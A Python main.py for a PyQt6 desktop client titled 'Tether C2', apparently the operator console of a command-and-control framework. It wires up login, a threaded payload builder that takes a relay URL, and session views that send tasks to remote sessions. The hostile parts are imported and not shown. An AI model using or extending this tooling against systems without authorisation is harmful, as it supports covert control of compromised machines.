# main.py (Full Code - Corrected Constructor Call)
import sys
import psutil
import json
from PyQt6.QtWidgets import QApplication, QMainWindow, QStackedWidget, QStatusBar
from PyQt6.QtCore import QThread, pyqtSignal, Qt
from ui.login_screen import LoginScreen
from ui.dashboard_window import DashboardWindow
from ui.session_view import SessionView
from builder import build_payload
from config import RELAY_URL
from themes import ThemeManager
from api_client import ApiClient

class LocalSettingsManager:
    def __init__(self, db_file="tether_client_settings.db"):
        import sqlite3
        self.conn = sqlite3.connect(db_file, check_same_thread=False)
        self.conn.execute("CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, value TEXT)")
    def save_setting(self, key, value):
        self.conn.execute("INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)", (key, json.dumps(value)))
        self.conn.commit()
    def load_setting(self, key, default=None):
        cursor = self.conn.execute("SELECT value FROM settings WHERE key = ?", (key,))
        result = cursor.fetchone()
        return json.loads(result[0]) if result else default

class BuildThread(QThread):
    log_message = pyqtSignal(str)
    finished = pyqtSignal()
    def __init__(self, settings, relay_url, c2_user):
        super().__init__()
        self.settings, self.relay_url, self.c2_user = settings, relay_url, c2_user
        self.proc = None; self._is_running = True

    def run(self):
        self.proc = build_payload(self.settings, self.relay_url, self.c2_user, self.log_message.emit, self)
        if self._is_running and self.proc: self.finished.emit()

    def stop(self):
        self._is_running = False
        if self.proc and self.proc.poll() is None:
            try:
                parent = psutil.Process(self.proc.pid)
                for child in parent.children(recursive=True): child.terminate()
                self.proc.terminate(); self.log_message.emit("\n[INFO] Build process termination signal sent.")
                self.proc.wait(timeout=5)
            except (psutil.NoSuchProcess, psutil.subprocess.TimeoutExpired, Exception):
                if self.proc.poll() is None: self.proc.kill()
        self.finished.emit()

class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Tether C2")
        self.setGeometry(100, 100, 1600, 900)
        self.db = LocalSettingsManager()
        self.api = ApiClient(self)
        self.current_user = None
        self.theme_manager = ThemeManager()
        self.setStatusBar(QStatusBar(self))
        
        self.stack = QStackedWidget()
        self.setCentralWidget(self.stack)

        self.login_screen = LoginScreen(self.api)
        self.stack.addWidget(self.login_screen)
        
        self.dashboard_view = None
        self.session_view = None

        self.login_screen.login_successful.connect(self.show_dashboard_view)
        saved_theme = self.db.load_setting("theme", "Dark (Default)")
        self.apply_theme(saved_theme)

    def apply_theme(self, theme_name):
        stylesheet = self.theme_manager.get_stylesheet(theme_name)
        self.setStyleSheet(stylesheet)
        if self.dashboard_view: self.dashboard_view.setStyleSheet(stylesheet)
        if self.session_view: self.session_view.setStyleSheet(stylesheet)

    def show_dashboard_view(self, username):
        self.current_user = username
        self.dashboard_view = DashboardWindow(self.api, self.db, self.current_user)
        
        # --- DEFINITIVE BUG FIX APPLIED HERE ---
        # The db manager is now correctly passed to the SessionView constructor again.
        self.session_view = SessionView(self.db)
        
        self.stack.addWidget(self.dashboard_view)
        self.stack.addWidget(self.session_view)

        self.dashboard_view.sign_out_requested.connect(self.handle_sign_out)
        self.dashboard_view.setting_changed.connect(self.handle_setting_changed)
        self.dashboard_view.build_requested.connect(self.start_build)
        self.dashboard_view.session_interact_requested.connect(self.open_session_view)
        self.session_view.back_requested.connect(lambda: self.stack.setCurrentWidget(self.dashboard_view))
        self.session_view.task_requested.connect(self.dashboard_view.send_task_from_session)
        self.dashboard_view.data_updated_for_session.connect(self.session_view.handle_command_response)

        self.stack.setCurrentWidget(self.dashboard_view)
        self.statusBar().showMessage(f"Logged in as {username}.", 3000)

    def open_session_view(self, session_id, session_data):
        self.session_view.load_session(session_id, session_data)
        self.stack.setCurrentWidget(self.session_view)
        
    def handle_setting_changed(self, key, value):
        self.db.save_setting(key, value)
        if key == "theme": self.apply_theme(value)

    def start_build(self, settings):
        self.dashboard_view.builder_pane.show_build_log_pane()
        self.dashboard_view.builder_pane.build_button.setEnabled(False)
        
        self.build_thread = BuildThread(settings, RELAY_URL, self.current_user)
        self.build_thread.log_message.connect(self.dashboard_view.builder_pane.build_log_output.append)
        self.build_thread.finished.connect(self.on_build_finished)
        self.dashboard_view.builder_pane.stop_build_button.clicked.connect(self.stop_build)
        self.build_thread.start()

    def stop_build(self):
        if hasattr(self, 'build_thread'): self.build_thread.stop()

    def on_build_finished(self):
        if self.dashboard_view:
            self.dashboard_view.builder_pane.build_button.setEnabled(True)
            self.dashboard_view.builder_pane.stop_build_button.setEnabled(False)
            self.dashboard_view.builder_pane.back_to_builder_button.show()
    
    def handle_sign_out(self):
        if self.dashboard_view:
            self.dashboard_view.stop_polling()
            self.stack.removeWidget(self.dashboard_view); self.dashboard_view.deleteLater(); self.dashboard_view = None
        if self.session_view:
            self.stack.removeWidget(self.session_view); self.session_view.deleteLater(); self.session_view = None
        self.current_user = None
        self.stack.setCurrentWidget(self.login_screen)
        self.statusBar().showMessage("Signed out.", 3000)

if __name__ == '__main__':
    app = QApplication(sys.argv)
    window = MainWindow()
    window.show()
    sys.exit(app.exec())